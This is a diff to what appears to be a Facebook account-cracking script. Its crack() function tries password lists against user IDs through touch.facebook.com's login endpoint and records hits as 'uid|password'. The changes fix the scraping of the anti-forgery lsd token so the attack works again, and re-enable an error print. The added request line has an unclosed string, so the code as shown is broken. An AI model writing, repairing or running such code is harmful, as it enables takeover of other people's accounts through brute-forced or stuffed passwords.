@@ -139,6 +139,7 @@ def crack(uid, password_list, total_count):
             'fr': fr,
             'dpr': '2.75',
             'wd': '980x1040',}
+            response2 = session.get('https://touch.facebook.com)
             headers = {
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -146,7 +147,7 @@ def crack(uid, password_list, total_count):
             'sec-ch-ua-mobile': '?0',
             'viewport-width': '980',
             'x-fb-friendly-name': 'useCDSWebLoginMutation',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(response.text)).group(1),
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(response2.text)).group(1),
             'x-asbd-id': '359341',
             'dpr': '2.75',
             'sec-ch-ua-full-version-list': '".Not/A)Brand";v="99.0.0.0", "Google Chrome";v="103.0.5060.129", "Chromium";v="103.0.5060.129"',
@@ -259,7 +260,7 @@ def crack(uid, password_list, total_count):
                 cps.append(uid+"|"+pw)
                 continue
             else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
+                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
         loop += 1
     except requests.exceptions.Timeout:
